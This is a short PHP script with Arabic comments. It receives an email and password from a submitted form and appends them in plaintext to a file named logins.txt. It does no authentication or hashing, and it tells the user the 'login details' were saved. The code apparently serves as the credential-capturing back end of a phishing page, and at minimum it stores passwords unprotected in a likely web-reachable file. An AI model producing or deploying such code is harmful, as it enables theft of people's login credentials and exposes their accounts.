<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال البريد الإلكتروني وكلمة المرور من النموذج
    $email = $_POST['email'];
    $password = $_POST['password'];

    // تحقق مما إذا كانت قيمة المتغيرات غير فارغة
    if (!empty($email) && !empty($password)) {
        // فتح أو إنشاء ملف لحفظ البريد الإلكتروني وكلمة المرور
        $file = fopen("logins.txt", "a");

        // كتابة البريد الإلكتروني وكلمة المرور إلى الملف
        fwrite($file, "Email: " . $email . " - Password: " . $password . "\n");

        // إغلاق الملف بعد الكتابة
        fclose($file);

        // رسالة نجاح للمستخدم
        echo "<p>Login details saved successfully!</p>";
    } else {
        // رسالة خطأ في حالة عدم توفر البريد الإلكتروني أو كلمة المرور
        echo "<p>Please fill in both email and password fields.</p>";
    }
}
?>
